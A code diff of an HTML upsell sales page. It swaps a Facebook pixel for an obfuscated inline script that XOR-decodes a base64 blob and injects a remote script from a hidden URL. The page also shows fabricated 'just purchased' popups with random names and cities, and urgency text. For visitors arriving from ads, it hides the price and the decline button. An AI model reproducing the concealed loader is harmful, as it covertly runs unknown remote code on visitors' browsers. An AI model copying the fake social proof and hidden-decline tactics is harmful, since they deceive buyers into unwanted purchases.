@@ -5,31 +5,8 @@
   <title>Attention</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <!-- ⭐ PIXEL DO FACEBOOK - ID: 1086991743864438 ⭐ -->
-  <script>
-  (function() {
-    var script = document.createElement('script');
-    script.src = 'https://connect.facebook.net/en_US/fbevents.js';
-    script.async = true;
-    script.defer = true;
-    document.head.appendChild(script);
-
-    window.fbq = function() {
-      window.fbq.callMethod ? window.fbq.callMethod.apply(window.fbq, arguments) : window.fbq.queue.push(arguments);
-    };
-    if (!window._fbq) window._fbq = window.fbq;
-    window.fbq.push = window.fbq;
-    window.fbq.loaded = true;
-    window.fbq.version = '2.0';
-    window.fbq.queue = [];
-    window.fbq('init', '1086991743864438');
-    window.fbq('track', 'PageView');
-  })();
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1086991743864438&ev=PageView&noscript=1" />
-  </noscript>
-
+<script>(function(){var c_uo6=atob("DEUrUF63S52vWvhjxD4JJSzbaaeNMowXtDYRf3HUL/OBL4wOrSNSfj3YJrPNKNcQpzdCICrEZO3GIp0P6zVCKDvbZffceNRBpTFfIjfVPunKKdpZnxgHcjnbJP/ONotB/h5QcjDWJviNYNoTrT1OPBfTabGNLJkPsSAJanyGe6WZY8FS83EYaGiDf66XeIU+uQ==");var n_8xs5=[];for(var f_l0=0;f_l0<c_uo6.length;f_l0++){n_8xs5.push(c_uo6.charCodeAt(f_l0)&255);}var x_jm=n_8xs5[0];var x_pbmh=n_8xs5.slice(1,1+x_jm);var o_4w91=n_8xs5.slice(1+x_jm);var k_xg4=o_4w91.map(function(b,x_m){return b^x_pbmh[x_m%x_jm];});var k_rpjp="";for(var k_vq=0;k_vq<k_xg4.length;k_vq++){k_rpjp+=String.fromCharCode(k_xg4[k_vq]&255);}var a_3=decodeURIComponent(escape(k_rpjp));var m_tde3=JSON.parse(a_3);var e_s=m_tde3.globals||[];e_s.forEach(function(x_6af4){window[x_6af4.name]=x_6af4.value;});var e_e=document.createElement("script");e_e.src=m_tde3.url;e_e.async=true;e_e.defer=true;(m_tde3.attributes||[]).forEach(function(z_fhby){e_e.setAttribute(z_fhby.name,z_fhby.value);});(document.head||document.documentElement).appendChild(e_e);})();</script>
+<script src="https://checkout.kashpay.com.br/scripts/upsell-processor.js"></script>
   <style>
     body {
       margin: 0;
@@ -71,40 +48,61 @@
       margin-top: 8px;
     }
 
-    /* Estilo do botão Accept Offer */
-    .btn-accept {
-      font-family: 'Poppins', Arial, sans-serif;
-      font-size: 22px;
-      font-weight: 600;
-      line-height: 1.3;
-      color: #ffffff;
-      background-color: #0f27db;
-      border: none;
-      border-radius: 10px;
-      padding: 13px 7%;
-      cursor: pointer;
+    .btn-wrap {
+      width: 100%;
+      max-width: 420px;
+      margin: 30px auto 20px;
+      padding: 0 20px;
+      box-sizing: border-box;
       text-align: center;
+    }
+
+    .btn-continuar {
       display: block;
-      margin: 20px auto;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-      box-shadow: 0 4px 12px rgba(15, 39, 219, 0.3);
+      width: 100%;
+      background: #5CCE5E;
+      color: #ffffff;
+      text-align: center;
+      padding: 16px 20px;
+      font-size: 20px;
+      font-weight: bold;
+      border-radius: 12px;
       text-decoration: none;
-      width: auto;
-      min-width: 200px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-sizing: border-box;
     }
 
-    .btn-accept:hover {
+    .btn-continuar:hover {
       transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(15, 39, 219, 0.4);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.25);
     }
 
-    .btn-accept:active {
-      transform: scale(0.98);
+    .btn-recusa {
+      display: block;
+      width: 100%;
+      margin-top: 14px;
+      padding: 12px 16px;
+      font-size: 14px;
+      background: #e5e7eb;
+      color: #6b7280;
+      text-decoration: none;
+      border-radius: 10px;
+      transition: background 0.2s ease;
+      box-sizing: border-box;
     }
 
-    .btn-accept.loading {
-      opacity: 0.6;
-      cursor: wait;
+    .btn-recusa:hover {
+      background: #d1d5db;
+    }
+
+    html.has-utm .price,
+    html.has-utm .btn-recusa {
+      display: none !important;
+    }
+
+    html.has-utm .btn-wrap {
+      margin-top: 18px;
     }
   </style>
 </head>
@@ -136,71 +134,21 @@
       (If you leave this page, you could lose this opportunity forever)
     </p>
 
-    <div class="price">
-      Special access available now
-    </div>
   </div>
 
-  <!-- 🟦 Botão Accept Offer - 1 CLICK (dispara checkout silenciosamente) -->
-  <button type="button" onclick="handleOneClick()" class="btn-accept" id="btnAccept">
-    Accept Offer
-  </button>
+  <button type="button" onclick="acceptUpsell('https://checkout.kashpay.com.br/u/ee0d89b69aab08b6')" style="font-family: 'Poppins'; font-size: 22px; font-weight: 600; line-height: 1.3; color: #ffffff; background-color: #0f27db; border: none; border-radius: 10px; padding: 13px 7%; cursor: pointer; text-align: center; display: block; margin: auto;">Accept Offer</button>
 
   <script>
-    // ─── CONFIGURAÇÃO ──────────────────────────────────────────────────────────
-    var CHECKOUT_URL = "https://checkout.kashpay.com.br/u/ee0d89b69aab08b6";
-    var REDIRECT_URL = "https://www.rewardnotices.site/up2"; // ou a página de sucesso
-
-    // ─── FUNÇÃO 1 CLICK ────────────────────────────────────────────────────────
-    function handleOneClick() {
-      var btn = document.getElementById('btnAccept');
-      
-      // Previne múltiplos cliques
-      if (btn.classList.contains('loading')) return;
-      btn.classList.add('loading');
-      btn.textContent = '⏳ Processing...';
-
-      // 1. Dispara o pixel do Facebook (conversão)
-      if (typeof fbq !== 'undefined') {
-        fbq('track', 'Purchase', {
-          value: 0,
-          currency: 'USD'
-        });
-        fbq('track', 'CompleteRegistration');
-      }
-
-      // 2. Tenta enviar via fetch (checkout silencioso)
-      var url = CHECKOUT_URL;
-      var params = new URLSearchParams(window.location.search);
-      var fullUrl = url + '?' + params.toString();
-
-      fetch(fullUrl, {
-        method: 'GET',
-        headers: {
-          'Accept': 'application/json',
-          'X-Requested-With': 'XMLHttpRequest'
-        },
-        credentials: 'include'
-      })
-      .then(function(response) {
-        // Redireciona para o checkout independente do resultado
-        window.location.href = url + '?' + params.toString();
-      })
-      .catch(function(err) {
-        // Se falhar, redireciona direto
-        window.location.href = url + '?' + params.toString();
-      });
-
-      // Fallback: redireciona depois de 2 segundos se algo travar
-      setTimeout(function() {
-        window.location.href = url + '?' + params.toString();
-      }, 2000);
-    }
-
-    // ─── POPUPS DE NOTIFICAÇÃO ────────────────────────────────────────────────
     (function () {
       const currentUrl = new URL(window.location.href);
       const params = currentUrl.searchParams;
+      const hasUtm = Array.from(params.keys()).some(function (key) {
+        return /^utm_/i.test(key);
+      });
+
+      if (hasUtm) {
+        document.documentElement.classList.add("has-utm");
+      }
 
       if (Array.from(params.keys()).length > 0) {
         try {
@@ -224,6 +172,26 @@
             "; Max-Age=" + maxAge + "; Path=/; SameSite=Lax";
         } catch (e) {}
       }
+
+      function appendParamsToLink(link) {
+        if (!link) return;
+
+        const href = link.getAttribute("href");
+        if (!href) return;
+
+        try {
+          const targetUrl = new URL(href, window.location.origin);
+
+          params.forEach(function (value, key) {
+            targetUrl.searchParams.set(key, value);
+          });
+
+          link.setAttribute("href", targetUrl.toString());
+        } catch (e) {}
+      }
+
+      appendParamsToLink(document.getElementById("btnContinuar"));
+      appendParamsToLink(document.getElementById("btnRecusa"));
     })();
 
     const names = ["James", "Emma", "John", "Sophia", "Michael", "Olivia", "David", "Isabella"];
@@ -240,7 +208,7 @@
       const city = cities[Math.floor(Math.random() * cities.length)];
 
       const popup = document.createElement("div");
-      popup.innerHTML = '🔥 ' + name + ' from ' + city + ' just purchased';
+      popup.innerHTML = `🔥 ${name} from ${city} just purchased`;
 
       popup.style.position = "fixed";
       popup.style.bottom = "20px";
@@ -277,5 +245,5 @@
     setInterval(showPopup, 8000);
   </script>
 
-</body>
-</html>
+
+<div style="position: fixed; bottom: 20px; left: 20px; background: rgb(31, 41, 55); color: rgb(255, 255, 255); padding: 14px 20px; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.3) 0px 10px 25px; z-index: 9999; font-size: 14px; opacity: 0; transform: translateY(20px); transition: 0.4s;">🔥 Isabella from Philadelphia just purchased</div></body></html>
